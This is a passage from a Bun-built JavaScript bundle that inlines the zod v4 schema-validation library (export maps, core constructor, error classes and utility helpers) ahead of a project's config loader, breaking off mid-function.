// @bun
var __defProp = Object.defineProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, {
      get: all[name],
      enumerable: true,
      configurable: true,
      set: (newValue) => all[name] = () => newValue
    });
};

// src/index-core.ts
import { existsSync as existsSync10, mkdirSync as mkdirSync5, readFileSync as readFileSync8, readdirSync as readdirSync3, statSync as statSync4, writeFileSync as writeFileSync5 } from "fs";
import { dirname as dirname3, isAbsolute as isAbsolute4, join as join11, relative as relative3, resolve as resolve4 } from "path";

// src/config/loader.ts
import { existsSync, readFileSync } from "fs";
import { join } from "path";

// node_modules/zod/v4/classic/external.js
var exports_external = {};
__export(exports_external, {
  xor: () => xor,
  xid: () => xid2,
  void: () => _void2,
  uuidv7: () => uuidv7,
  uuidv6: () => uuidv6,
  uuidv4: () => uuidv4,
  uuid: () => uuid2,
  util: () => exports_util,
  url: () => url,
  uppercase: () => _uppercase,
  unknown: () => unknown,
  union: () => union,
  undefined: () => _undefined3,
  ulid: () => ulid2,
  uint64: () => uint64,
  uint32: () => uint32,
  tuple: () => tuple,
  trim: () => _trim,
  treeifyError: () => treeifyError,
  transform: () => transform,
  toUpperCase: () => _toUpperCase,
  toLowerCase: () => _toLowerCase,
  toJSONSchema: () => toJSONSchema,
  templateLiteral: () => templateLiteral,
  symbol: () => symbol,
  superRefine: () => superRefine,
  success: () => success,
  stringbool: () => stringbool,
  stringFormat: () => stringFormat,
  string: () => string2,
  strictObject: () => strictObject,
  startsWith: () => _startsWith,
  slugify: () => _slugify,
  size: () => _size,
  setErrorMap: () => setErrorMap,
  set: () => set,
  safeParseAsync: () => safeParseAsync2,
  safeParse: () => safeParse2,
  safeEncodeAsync: () => safeEncodeAsync2,
  safeEncode: () => safeEncode2,
  safeDecodeAsync: () => safeDecodeAsync2,
  safeDecode: () => safeDecode2,
  registry: () => registry,
  regexes: () => exports_regexes,
  regex: () => _regex,
  refine: () => refine,
  record: () => record,
  readonly: () => readonly,
  property: () => _property,
  promise: () => promise,
  prettifyError: () => prettifyError,
  preprocess: () => preprocess,
  prefault: () => prefault,
  positive: () => _positive,
  pipe: () => pipe,
  partialRecord: () => partialRecord,
  parseAsync: () => parseAsync2,
  parse: () => parse3,
  overwrite: () => _overwrite,
  optional: () => optional,
  object: () => object,
  number: () => number2,
  nullish: () => nullish2,
  nullable: () => nullable,
  null: () => _null3,
  normalize: () => _normalize,
  nonpositive: () => _nonpositive,
  nonoptional: () => nonoptional,
  nonnegative: () => _nonnegative,
  never: () => never,
  negative: () => _negative,
  nativeEnum: () => nativeEnum,
  nanoid: () => nanoid2,
  nan: () => nan,
  multipleOf: () => _multipleOf,
  minSize: () => _minSize,
  minLength: () => _minLength,
  mime: () => _mime,
  meta: () => meta2,
  maxSize: () => _maxSize,
  maxLength: () => _maxLength,
  map: () => map,
  mac: () => mac2,
  lte: () => _lte,
  lt: () => _lt,
  lowercase: () => _lowercase,
  looseRecord: () => looseRecord,
  looseObject: () => looseObject,
  locales: () => exports_locales,
  literal: () => literal,
  length: () => _length,
  lazy: () => lazy,
  ksuid: () => ksuid2,
  keyof: () => keyof,
  jwt: () => jwt,
  json: () => json,
  iso: () => exports_iso,
  ipv6: () => ipv62,
  ipv4: () => ipv42,
  intersection: () => intersection,
  int64: () => int64,
  int32: () => int32,
  int: () => int,
  instanceof: () => _instanceof,
  includes: () => _includes,
  httpUrl: () => httpUrl,
  hostname: () => hostname2,
  hex: () => hex2,
  hash: () => hash,
  guid: () => guid2,
  gte: () => _gte,
  gt: () => _gt,
  globalRegistry: () => globalRegistry,
  getErrorMap: () => getErrorMap,
  function: () => _function,
  fromJSONSchema: () => fromJSONSchema,
  formatError: () => formatError,
  float64: () => float64,
  float32: () => float32,
  flattenError: () => flattenError,
  file: () => file,
  exactOptional: () => exactOptional,
  enum: () => _enum2,
  endsWith: () => _endsWith,
  encodeAsync: () => encodeAsync2,
  encode: () => encode2,
  emoji: () => emoji2,
  email: () => email2,
  e164: () => e1642,
  discriminatedUnion: () => discriminatedUnion,
  describe: () => describe2,
  decodeAsync: () => decodeAsync2,
  decode: () => decode2,
  date: () => date3,
  custom: () => custom,
  cuid2: () => cuid22,
  cuid: () => cuid3,
  core: () => exports_core2,
  config: () => config,
  coerce: () => exports_coerce,
  codec: () => codec,
  clone: () => clone,
  cidrv6: () => cidrv62,
  cidrv4: () => cidrv42,
  check: () => check,
  catch: () => _catch2,
  boolean: () => boolean2,
  bigint: () => bigint2,
  base64url: () => base64url2,
  base64: () => base642,
  array: () => array,
  any: () => any,
  _function: () => _function,
  _default: () => _default2,
  _ZodString: () => _ZodString,
  ZodXor: () => ZodXor,
  ZodXID: () => ZodXID,
  ZodVoid: () => ZodVoid,
  ZodUnknown: () => ZodUnknown,
  ZodUnion: () => ZodUnion,
  ZodUndefined: () => ZodUndefined,
  ZodUUID: () => ZodUUID,
  ZodURL: () => ZodURL,
  ZodULID: () => ZodULID,
  ZodType: () => ZodType,
  ZodTuple: () => ZodTuple,
  ZodTransform: () => ZodTransform,
  ZodTemplateLiteral: () => ZodTemplateLiteral,
  ZodSymbol: () => ZodSymbol,
  ZodSuccess: () => ZodSuccess,
  ZodStringFormat: () => ZodStringFormat,
  ZodString: () => ZodString,
  ZodSet: () => ZodSet,
  ZodRecord: () => ZodRecord,
  ZodRealError: () => ZodRealError,
  ZodReadonly: () => ZodReadonly,
  ZodPromise: () => ZodPromise,
  ZodPrefault: () => ZodPrefault,
  ZodPipe: () => ZodPipe,
  ZodOptional: () => ZodOptional,
  ZodObject: () => ZodObject,
  ZodNumberFormat: () => ZodNumberFormat,
  ZodNumber: () => ZodNumber,
  ZodNullable: () => ZodNullable,
  ZodNull: () => ZodNull,
  ZodNonOptional: () => ZodNonOptional,
  ZodNever: () => ZodNever,
  ZodNanoID: () => ZodNanoID,
  ZodNaN: () => ZodNaN,
  ZodMap: () => ZodMap,
  ZodMAC: () => ZodMAC,
  ZodLiteral: () => ZodLiteral,
  ZodLazy: () => ZodLazy,
  ZodKSUID: () => ZodKSUID,
  ZodJWT: () => ZodJWT,
  ZodIssueCode: () => ZodIssueCode,
  ZodIntersection: () => ZodIntersection,
  ZodISOTime: () => ZodISOTime,
  ZodISODuration: () => ZodISODuration,
  ZodISODateTime: () => ZodISODateTime,
  ZodISODate: () => ZodISODate,
  ZodIPv6: () => ZodIPv6,
  ZodIPv4: () => ZodIPv4,
  ZodGUID: () => ZodGUID,
  ZodFunction: () => ZodFunction,
  ZodFirstPartyTypeKind: () => ZodFirstPartyTypeKind,
  ZodFile: () => ZodFile,
  ZodExactOptional: () => ZodExactOptional,
  ZodError: () => ZodError,
  ZodEnum: () => ZodEnum,
  ZodEmoji: () => ZodEmoji,
  ZodEmail: () => ZodEmail,
  ZodE164: () => ZodE164,
  ZodDiscriminatedUnion: () => ZodDiscriminatedUnion,
  ZodDefault: () => ZodDefault,
  ZodDate: () => ZodDate,
  ZodCustomStringFormat: () => ZodCustomStringFormat,
  ZodCustom: () => ZodCustom,
  ZodCodec: () => ZodCodec,
  ZodCatch: () => ZodCatch,
  ZodCUID2: () => ZodCUID2,
  ZodCUID: () => ZodCUID,
  ZodCIDRv6: () => ZodCIDRv6,
  ZodCIDRv4: () => ZodCIDRv4,
  ZodBoolean: () => ZodBoolean,
  ZodBigIntFormat: () => ZodBigIntFormat,
  ZodBigInt: () => ZodBigInt,
  ZodBase64URL: () => ZodBase64URL,
  ZodBase64: () => ZodBase64,
  ZodArray: () => ZodArray,
  ZodAny: () => ZodAny,
  TimePrecision: () => TimePrecision,
  NEVER: () => NEVER,
  $output: () => $output,
  $input: () => $input,
  $brand: () => $brand
});

// node_modules/zod/v4/core/index.js
var exports_core2 = {};
__export(exports_core2, {
  version: () => version,
  util: () => exports_util,
  treeifyError: () => treeifyError,
  toJSONSchema: () => toJSONSchema,
  toDotPath: () => toDotPath,
  safeParseAsync: () => safeParseAsync,
  safeParse: () => safeParse,
  safeEncodeAsync: () => safeEncodeAsync,
  safeEncode: () => safeEncode,
  safeDecodeAsync: () => safeDecodeAsync,
  safeDecode: () => safeDecode,
  registry: () => registry,
  regexes: () => exports_regexes,
  process: () => process2,
  prettifyError: () => prettifyError,
  parseAsync: () => parseAsync,
  parse: () => parse,
  meta: () => meta,
  locales: () => exports_locales,
  isValidJWT: () => isValidJWT,
  isValidBase64URL: () => isValidBase64URL,
  isValidBase64: () => isValidBase64,
  initializeContext: () => initializeContext,
  globalRegistry: () => globalRegistry,
  globalConfig: () => globalConfig,
  formatError: () => formatError,
  flattenError: () => flattenError,
  finalize: () => finalize,
  extractDefs: () => extractDefs,
  encodeAsync: () => encodeAsync,
  encode: () => encode,
  describe: () => describe,
  decodeAsync: () => decodeAsync,
  decode: () => decode,
  createToJSONSchemaMethod: () => createToJSONSchemaMethod,
  createStandardJSONSchemaMethod: () => createStandardJSONSchemaMethod,
  config: () => config,
  clone: () => clone,
  _xor: () => _xor,
  _xid: () => _xid,
  _void: () => _void,
  _uuidv7: () => _uuidv7,
  _uuidv6: () => _uuidv6,
  _uuidv4: () => _uuidv4,
  _uuid: () => _uuid,
  _url: () => _url,
  _uppercase: () => _uppercase,
  _unknown: () => _unknown,
  _union: () => _union,
  _undefined: () => _undefined2,
  _ulid: () => _ulid,
  _uint64: () => _uint64,
  _uint32: () => _uint32,
  _tuple: () => _tuple,
  _trim: () => _trim,
  _transform: () => _transform,
  _toUpperCase: () => _toUpperCase,
  _toLowerCase: () => _toLowerCase,
  _templateLiteral: () => _templateLiteral,
  _symbol: () => _symbol,
  _superRefine: () => _superRefine,
  _success: () => _success,
  _stringbool: () => _stringbool,
  _stringFormat: () => _stringFormat,
  _string: () => _string,
  _startsWith: () => _startsWith,
  _slugify: () => _slugify,
  _size: () => _size,
  _set: () => _set,
  _safeParseAsync: () => _safeParseAsync,
  _safeParse: () => _safeParse,
  _safeEncodeAsync: () => _safeEncodeAsync,
  _safeEncode: () => _safeEncode,
  _safeDecodeAsync: () => _safeDecodeAsync,
  _safeDecode: () => _safeDecode,
  _regex: () => _regex,
  _refine: () => _refine,
  _record: () => _record,
  _readonly: () => _readonly,
  _property: () => _property,
  _promise: () => _promise,
  _positive: () => _positive,
  _pipe: () => _pipe,
  _parseAsync: () => _parseAsync,
  _parse: () => _parse,
  _overwrite: () => _overwrite,
  _optional: () => _optional,
  _number: () => _number,
  _nullable: () => _nullable,
  _null: () => _null2,
  _normalize: () => _normalize,
  _nonpositive: () => _nonpositive,
  _nonoptional: () => _nonoptional,
  _nonnegative: () => _nonnegative,
  _never: () => _never,
  _negative: () => _negative,
  _nativeEnum: () => _nativeEnum,
  _nanoid: () => _nanoid,
  _nan: () => _nan,
  _multipleOf: () => _multipleOf,
  _minSize: () => _minSize,
  _minLength: () => _minLength,
  _min: () => _gte,
  _mime: () => _mime,
  _maxSize: () => _maxSize,
  _maxLength: () => _maxLength,
  _max: () => _lte,
  _map: () => _map,
  _mac: () => _mac,
  _lte: () => _lte,
  _lt: () => _lt,
  _lowercase: () => _lowercase,
  _literal: () => _literal,
  _length: () => _length,
  _lazy: () => _lazy,
  _ksuid: () => _ksuid,
  _jwt: () => _jwt,
  _isoTime: () => _isoTime,
  _isoDuration: () => _isoDuration,
  _isoDateTime: () => _isoDateTime,
  _isoDate: () => _isoDate,
  _ipv6: () => _ipv6,
  _ipv4: () => _ipv4,
  _intersection: () => _intersection,
  _int64: () => _int64,
  _int32: () => _int32,
  _int: () => _int,
  _includes: () => _includes,
  _guid: () => _guid,
  _gte: () => _gte,
  _gt: () => _gt,
  _float64: () => _float64,
  _float32: () => _float32,
  _file: () => _file,
  _enum: () => _enum,
  _endsWith: () => _endsWith,
  _encodeAsync: () => _encodeAsync,
  _encode: () => _encode,
  _emoji: () => _emoji2,
  _email: () => _email,
  _e164: () => _e164,
  _discriminatedUnion: () => _discriminatedUnion,
  _default: () => _default,
  _decodeAsync: () => _decodeAsync,
  _decode: () => _decode,
  _date: () => _date,
  _custom: () => _custom,
  _cuid2: () => _cuid2,
  _cuid: () => _cuid,
  _coercedString: () => _coercedString,
  _coercedNumber: () => _coercedNumber,
  _coercedDate: () => _coercedDate,
  _coercedBoolean: () => _coercedBoolean,
  _coercedBigint: () => _coercedBigint,
  _cidrv6: () => _cidrv6,
  _cidrv4: () => _cidrv4,
  _check: () => _check,
  _catch: () => _catch,
  _boolean: () => _boolean,
  _bigint: () => _bigint,
  _base64url: () => _base64url,
  _base64: () => _base64,
  _array: () => _array,
  _any: () => _any,
  TimePrecision: () => TimePrecision,
  NEVER: () => NEVER,
  JSONSchemaGenerator: () => JSONSchemaGenerator,
  JSONSchema: () => exports_json_schema,
  Doc: () => Doc,
  $output: () => $output,
  $input: () => $input,
  $constructor: () => $constructor,
  $brand: () => $brand,
  $ZodXor: () => $ZodXor,
  $ZodXID: () => $ZodXID,
  $ZodVoid: () => $ZodVoid,
  $ZodUnknown: () => $ZodUnknown,
  $ZodUnion: () => $ZodUnion,
  $ZodUndefined: () => $ZodUndefined,
  $ZodUUID: () => $ZodUUID,
  $ZodURL: () => $ZodURL,
  $ZodULID: () => $ZodULID,
  $ZodType: () => $ZodType,
  $ZodTuple: () => $ZodTuple,
  $ZodTransform: () => $ZodTransform,
  $ZodTemplateLiteral: () => $ZodTemplateLiteral,
  $ZodSymbol: () => $ZodSymbol,
  $ZodSuccess: () => $ZodSuccess,
  $ZodStringFormat: () => $ZodStringFormat,
  $ZodString: () => $ZodString,
  $ZodSet: () => $ZodSet,
  $ZodRegistry: () => $ZodRegistry,
  $ZodRecord: () => $ZodRecord,
  $ZodRealError: () => $ZodRealError,
  $ZodReadonly: () => $ZodReadonly,
  $ZodPromise: () => $ZodPromise,
  $ZodPrefault: () => $ZodPrefault,
  $ZodPipe: () => $ZodPipe,
  $ZodOptional: () => $ZodOptional,
  $ZodObjectJIT: () => $ZodObjectJIT,
  $ZodObject: () => $ZodObject,
  $ZodNumberFormat: () => $ZodNumberFormat,
  $ZodNumber: () => $ZodNumber,
  $ZodNullable: () => $ZodNullable,
  $ZodNull: () => $ZodNull,
  $ZodNonOptional: () => $ZodNonOptional,
  $ZodNever: () => $ZodNever,
  $ZodNanoID: () => $ZodNanoID,
  $ZodNaN: () => $ZodNaN,
  $ZodMap: () => $ZodMap,
  $ZodMAC: () => $ZodMAC,
  $ZodLiteral: () => $ZodLiteral,
  $ZodLazy: () => $ZodLazy,
  $ZodKSUID: () => $ZodKSUID,
  $ZodJWT: () => $ZodJWT,
  $ZodIntersection: () => $ZodIntersection,
  $ZodISOTime: () => $ZodISOTime,
  $ZodISODuration: () => $ZodISODuration,
  $ZodISODateTime: () => $ZodISODateTime,
  $ZodISODate: () => $ZodISODate,
  $ZodIPv6: () => $ZodIPv6,
  $ZodIPv4: () => $ZodIPv4,
  $ZodGUID: () => $ZodGUID,
  $ZodFunction: () => $ZodFunction,
  $ZodFile: () => $ZodFile,
  $ZodExactOptional: () => $ZodExactOptional,
  $ZodError: () => $ZodError,
  $ZodEnum: () => $ZodEnum,
  $ZodEncodeError: () => $ZodEncodeError,
  $ZodEmoji: () => $ZodEmoji,
  $ZodEmail: () => $ZodEmail,
  $ZodE164: () => $ZodE164,
  $ZodDiscriminatedUnion: () => $ZodDiscriminatedUnion,
  $ZodDefault: () => $ZodDefault,
  $ZodDate: () => $ZodDate,
  $ZodCustomStringFormat: () => $ZodCustomStringFormat,
  $ZodCustom: () => $ZodCustom,
  $ZodCodec: () => $ZodCodec,
  $ZodCheckUpperCase: () => $ZodCheckUpperCase,
  $ZodCheckStringFormat: () => $ZodCheckStringFormat,
  $ZodCheckStartsWith: () => $ZodCheckStartsWith,
  $ZodCheckSizeEquals: () => $ZodCheckSizeEquals,
  $ZodCheckRegex: () => $ZodCheckRegex,
  $ZodCheckProperty: () => $ZodCheckProperty,
  $ZodCheckOverwrite: () => $ZodCheckOverwrite,
  $ZodCheckNumberFormat: () => $ZodCheckNumberFormat,
  $ZodCheckMultipleOf: () => $ZodCheckMultipleOf,
  $ZodCheckMinSize: () => $ZodCheckMinSize,
  $ZodCheckMinLength: () => $ZodCheckMinLength,
  $ZodCheckMimeType: () => $ZodCheckMimeType,
  $ZodCheckMaxSize: () => $ZodCheckMaxSize,
  $ZodCheckMaxLength: () => $ZodCheckMaxLength,
  $ZodCheckLowerCase: () => $ZodCheckLowerCase,
  $ZodCheckLessThan: () => $ZodCheckLessThan,
  $ZodCheckLengthEquals: () => $ZodCheckLengthEquals,
  $ZodCheckIncludes: () => $ZodCheckIncludes,
  $ZodCheckGreaterThan: () => $ZodCheckGreaterThan,
  $ZodCheckEndsWith: () => $ZodCheckEndsWith,
  $ZodCheckBigIntFormat: () => $ZodCheckBigIntFormat,
  $ZodCheck: () => $ZodCheck,
  $ZodCatch: () => $ZodCatch,
  $ZodCUID2: () => $ZodCUID2,
  $ZodCUID: () => $ZodCUID,
  $ZodCIDRv6: () => $ZodCIDRv6,
  $ZodCIDRv4: () => $ZodCIDRv4,
  $ZodBoolean: () => $ZodBoolean,
  $ZodBigIntFormat: () => $ZodBigIntFormat,
  $ZodBigInt: () => $ZodBigInt,
  $ZodBase64URL: () => $ZodBase64URL,
  $ZodBase64: () => $ZodBase64,
  $ZodAsyncError: () => $ZodAsyncError,
  $ZodArray: () => $ZodArray,
  $ZodAny: () => $ZodAny
});

// node_modules/zod/v4/core/core.js
var NEVER = Object.freeze({
  status: "aborted"
});
function $constructor(name, initializer, params) {
  function init(inst, def) {
    if (!inst._zod) {
      Object.defineProperty(inst, "_zod", {
        value: {
          def,
          constr: _,
          traits: new Set
        },
        enumerable: false
      });
    }
    if (inst._zod.traits.has(name)) {
      return;
    }
    inst._zod.traits.add(name);
    initializer(inst, def);
    const proto = _.prototype;
    const keys = Object.keys(proto);
    for (let i = 0;i < keys.length; i++) {
      const k = keys[i];
      if (!(k in inst)) {
        inst[k] = proto[k].bind(inst);
      }
    }
  }
  const Parent = params?.Parent ?? Object;

  class Definition extends Parent {
  }
  Object.defineProperty(Definition, "name", { value: name });
  function _(def) {
    var _a;
    const inst = params?.Parent ? new Definition : this;
    init(inst, def);
    (_a = inst._zod).deferred ?? (_a.deferred = []);
    for (const fn of inst._zod.deferred) {
      fn();
    }
    return inst;
  }
  Object.defineProperty(_, "init", { value: init });
  Object.defineProperty(_, Symbol.hasInstance, {
    value: (inst) => {
      if (params?.Parent && inst instanceof params.Parent)
        return true;
      return inst?._zod?.traits?.has(name);
    }
  });
  Object.defineProperty(_, "name", { value: name });
  return _;
}
var $brand = Symbol("zod_brand");

class $ZodAsyncError extends Error {
  constructor() {
    super(`Encountered Promise during synchronous parse. Use .parseAsync() instead.`);
  }
}

class $ZodEncodeError extends Error {
  constructor(name) {
    super(`Encountered unidirectional transform during encode: ${name}`);
    this.name = "ZodEncodeError";
  }
}
var globalConfig = {};
function config(newConfig) {
  if (newConfig)
    Object.assign(globalConfig, newConfig);
  return globalConfig;
}
// node_modules/zod/v4/core/util.js
var exports_util = {};
__export(exports_util, {
  unwrapMessage: () => unwrapMessage,
  uint8ArrayToHex: () => uint8ArrayToHex,
  uint8ArrayToBase64url: () => uint8ArrayToBase64url,
  uint8ArrayToBase64: () => uint8ArrayToBase64,
  stringifyPrimitive: () => stringifyPrimitive,
  slugify: () => slugify,
  shallowClone: () => shallowClone,
  safeExtend: () => safeExtend,
  required: () => required,
  randomString: () => randomString,
  propertyKeyTypes: () => propertyKeyTypes,
  promiseAllObject: () => promiseAllObject,
  primitiveTypes: () => primitiveTypes,
  prefixIssues: () => prefixIssues,
  pick: () => pick,
  partial: () => partial,
  parsedType: () => parsedType,
  optionalKeys: () => optionalKeys,
  omit: () => omit,
  objectClone: () => objectClone,
  numKeys: () => numKeys,
  nullish: () => nullish,
  normalizeParams: () => normalizeParams,
  mergeDefs: () => mergeDefs,
  merge: () => merge,
  jsonStringifyReplacer: () => jsonStringifyReplacer,
  joinValues: () => joinValues,
  issue: () => issue,
  isPlainObject: () => isPlainObject,
  isObject: () => isObject,
  hexToUint8Array: () => hexToUint8Array,
  getSizableOrigin: () => getSizableOrigin,
  getParsedType: () => getParsedType,
  getLengthableOrigin: () => getLengthableOrigin,
  getEnumValues: () => getEnumValues,
  getElementAtPath: () => getElementAtPath,
  floatSafeRemainder: () => floatSafeRemainder,
  finalizeIssue: () => finalizeIssue,
  extend: () => extend,
  escapeRegex: () => escapeRegex,
  esc: () => esc,
  defineLazy: () => defineLazy,
  createTransparentProxy: () => createTransparentProxy,
  cloneDef: () => cloneDef,
  clone: () => clone,
  cleanRegex: () => cleanRegex,
  cleanEnum: () => cleanEnum,
  captureStackTrace: () => captureStackTrace,
  cached: () => cached,
  base64urlToUint8Array: () => base64urlToUint8Array,
  base64ToUint8Array: () => base64ToUint8Array,
  assignProp: () => assignProp,
  assertNotEqual: () => assertNotEqual,
  assertNever: () => assertNever,
  assertIs: () => assertIs,
  assertEqual: () => assertEqual,
  assert: () => assert,
  allowsEval: () => allowsEval,
  aborted: () => aborted,
  NUMBER_FORMAT_RANGES: () => NUMBER_FORMAT_RANGES,
  Class: () => Class,
  BIGINT_FORMAT_RANGES: () => BIGINT_FORMAT_RANGES
});
function assertEqual(val) {
  return val;
}
function assertNotEqual(val) {
  return val;
}
function assertIs(_arg) {}
function assertNever(_x) {
  throw new Error("Unexpected value in exhaustive check");
}
function assert(_) {}
function getEnumValues(entries) {
  const numericValues = Object.values(entries).filter((v) => typeof v === "number");
  const values = Object.entries(entries).filter(([k, _]) => numericValues.indexOf(+k) === -1).map(([_, v]) => v);
  return values;
}
function joinValues(array, separator = "|") {
  return array.map((val) => stringifyPrimitive(val)).join(separator);
}
function jsonStringifyReplacer(_, value) {
  if (typeof value === "bigint")
    return value.toString();
  return value;
}
function cached(getter) {
  const set = false;
  return {
    get value() {
      if (!set) {
        const value = getter();
        Object.defineProperty(this, "value", { value });
        return value;
      }
      throw new Error("cached value already set");
    }
  };
}
function nullish(input) {
  return input === null || input === undefined;
}
function cleanRegex(source) {
  const start = source.startsWith("^") ? 1 : 0;
  const end = source.endsWith("$") ? source.length - 1 : source.length;
  return source.slice(start, end);
}
function floatSafeRemainder(val, step) {
  const valDecCount = (val.toString().split(".")[1] || "").length;
  const stepString = step.toString();
  let stepDecCount = (stepString.split(".")[1] || "").length;
  if (stepDecCount === 0 && /\d?e-\d?/.test(stepString)) {
    const match = stepString.match(/\d?e-(\d?)/);
    if (match?.[1]) {
      stepDecCount = Number.parseInt(match[1]);
    }
  }
  const decCount = valDecCount > stepDecCount ? valDecCount : stepDecCount;
  const valInt = Number.parseInt(val.toFixed(decCount).replace(".", ""));
  const stepInt = Number.parseInt(step.toFixed(decCount).replace(".", ""));
  return valInt % stepInt / 10 ** decCount;
}
var EVALUATING = Symbol("evaluating");
function defineLazy(object, key, getter) {
  let value = undefined;
  Object.defineProperty(object, key, {
    get() {
      if (value === EVALUATING) {
        return;
      }
      if (value === undefined) {
        value = EVALUATING;
        value = getter();
      }
      return value;
    },
    set(v) {
      Object.defineProperty(object, key, {
        value: v
      });
    },
    configurable: true
  });
}
function objectClone(obj) {
  return Object.create(Object.getPrototypeOf(obj), Object.getOwnPropertyDescriptors(obj));
}
function assignProp(target, prop, value) {
  Object.defineProperty(target, prop, {
    value,
    writable: true,
    enumerable: true,
    configurable: true
  });
}
function mergeDefs(...defs) {
  const mergedDescriptors = {};
  for (const def of defs) {
    const descriptors = Object.getOwnPropertyDescriptors(def);
    Object.assign(mergedDescriptors, descriptors);
  }
  return Object.defineProperties({}, mergedDescriptors);
}
function cloneDef(schema) {
  return mergeDefs(schema._zod.def);
}
function getElementAtPath(obj, path) {
  if (!path)
    return obj;
  return path.reduce((acc, key) => acc?.[key], obj);
}
function promiseAllObject(promisesObj) {
  const keys = Object.keys(promisesObj);
  const promises = keys.map((key) => promisesObj[key]);
  return Promise.all(promises).then((results) => {
    const resolvedObj = {};
    for (let i = 0;i < keys.length; i++) {
      resolvedObj[keys[i]] = results[i];
    }
    return resolvedObj;
  });
}
function randomString(length = 10) {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  let str = "";
  for (let i = 0;i < length; i++) {
    str += chars[Math.floor(Math.random() * chars.length)];
  }
  return str;
}
function esc(str) {
  return JSON.stringify(str);
}
function slugify(input) {
  return input.toLowerCase().trim().replace(/[^\w\s-]/g, "").replace(/[\s_-]+/g, "-").replace(/^-+|-+$/g, "");
}
var captureStackTrace = "captureStackTrace" in Error ? Error.captureStackTrace : (..._args) => {};
function isObject(data) {
  return typeof data === "object" && data !== null && !Array.isArray(data);
}
var allowsEval = cached(() => {
  if (typeof navigator !== "undefined" && navigator?.userAgent?.includes("Cloudflare")) {
    return false;
  }
  try {
    const F = Function;
    new F("");
    return true;
  } catch (_) {
    return false;
  }
});
function isPlainObject(o) {
  if (isObject(o) === false)
    return false;
  const ctor = o.constructor;
  if (ctor === undefined)
    return true;
  if (typeof ctor !== "function")
    return true;
  const prot = ctor.prototype;
  if (isObject(prot) === false)
    return false;
  if (Object.prototype.hasOwnProperty.call(prot, "isPrototypeOf") === false) {
    return false;
  }
  return true;
}
function shallowClone(o) {
  if (isPlainObject(o))
    return { ...o };
  if (Array.isArray(o))
    return [...o];
  return o;
}
function numKeys(data) {
  let keyCount = 0;
  for (const key in data) {
    if (Object.prototype.hasOwnProperty.call(data, key)) {
      keyCount++;
    }
  }
  return keyCount;
}
var getParsedType = (data) => {
  const t = typeof data;
  switch (t) {
    case "undefined":
      return "undefined";
    case "string":
      return "string";
    case "number":
      return Number.isNaN(data) ? "nan" : "number";
    case "boolean":
      return "boolean";
    case "function":
      return "function";
    case "bigint":
      return "bigint";
    case "symbol":
      return "symbol";
    case "object":
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (data.then && typeof data.then === "function" && data.catch && typeof data.catch === "function") {
        return "promise";
      }
      if (typeof Map !== "undefined" && data instanceof Map) {
        return "map";
      }
      if (typeof Set !== "undefined" && data instanceof Set) {
        return "set";
      }
      if (typeof Date !== "undefined" && data instanceof Date) {
        return "date";
      }
      if (typeof File !== "undefined" && data instanceof File) {
        return "file";
      }
      return "object";
    default:
      throw new Error(`Unknown data type: ${t}`);
  }
};
var propertyKeyTypes = new Set(["string", "number", "symbol"]);
var primitiveTypes = new Set(["string", "number", "bigint", "boolean", "symbol", "undefined"]);
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
function clone(inst, def, params) {
  const cl = new inst._zod.constr(def ?? inst._zod.def);
  if (!def || params?.parent)
    cl._zod.parent = inst;
  return cl;
}
function normalizeParams(_params) {
  const params = _params;
  if (!params)
    return {};
  if (typeof params === "string")
    return { error: () => params };
  if (params?.message !== undefined) {
    if (params?.error !== undefined)
      throw new Error("Cannot specify both `message` and `error` params");
    params.error = params.message;
  }
  delete params.message;
  if (typeof params.error === "string")
    return { ...params, error: () => params.error };
  return params;
}
function createTransparentProxy(getter) {
  let target;
  return new Proxy({}, {
    get(_, prop, receiver) {
      target ?? (target = getter());
      return Reflect.get(target, prop, receiver);
    },
    set(_, prop, value, receiver) {
      target ?? (target = getter());
      return Reflect.set(target, prop, value, receiver);
    },
    has(_, prop) {
      target ?? (target = getter());
      return Reflect.has(target, prop);
    },
    deleteProperty(_, prop) {
      target ?? (target = getter());
      return Reflect.deleteProperty(target, prop);
    },
    ownKeys(_) {
      target ?? (target = getter());
      return Reflect.ownKeys(target);
    },
    getOwnPropertyDescriptor(_, prop) {
      target ?? (target = getter());
      return Reflect.getOwnPropertyDescriptor(target, prop);
    },
    defineProperty(_, prop, descriptor) {
      target ?? (target = getter());
      return Reflect.defineProperty(target, prop, descriptor);
    }
  });
}
function stringifyPrimitive(value) {
  if (typeof value === "bigint")
    return value.toString() + "n";
  if (typeof value === "string")
    return `"${value}"`;
  return `${value}`;
}
function optionalKeys(shape) {
  return Object.keys(shape).filter((k) => {
    return shape[k]._zod.optin === "optional" && shape[k]._zod.optout === "optional";
  });
}
var NUMBER_FORMAT_RANGES = {
  safeint: [Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER],
  int32: [-2147483648, 2147483647],
  uint32: [0, 4294967295],
  float32: [-340282346638528860000000000000000000000, 340282346638528860000000000000000000000],
  float64: [-Number.MAX_VALUE, Number.MAX_VALUE]
};
var BIGINT_FORMAT_RANGES = {
  int64: [/* @__PURE__ */ BigInt("-9223372036854775808"), /* @__PURE__ */ BigInt("9223372036854775807")],
  uint64: [/* @__PURE__ */ BigInt(0), /* @__PURE__ */ BigInt("18446744073709551615")]
};
function pick(schema, mask) {
  const currDef = schema._zod.def;
  const checks = currDef.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    throw new Error(".pick() cannot be used on object schemas containing refinements");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const newShape = {};
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        newShape[key] = currDef.shape[key];
      }
      assignProp(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone(schema, def);
}
function omit(schema, mask) {
  const currDef = schema._zod.def;
  const checks = currDef.checks;
  const hasChecks = checks && checks.length > 0;
  if (hasChecks) {
    throw new Error(".omit() cannot be used on object schemas containing refinements");
  }
  const def = mergeDefs(schema._zod.def, {
    get shape() {
      const newShape = { ...schema._zod.def.shape };
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        delete newShape[key];
      }
      assignProp(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone(schema, def);
}
function extend(schema, shape) {
  if (!isPlainObject(shape)) {
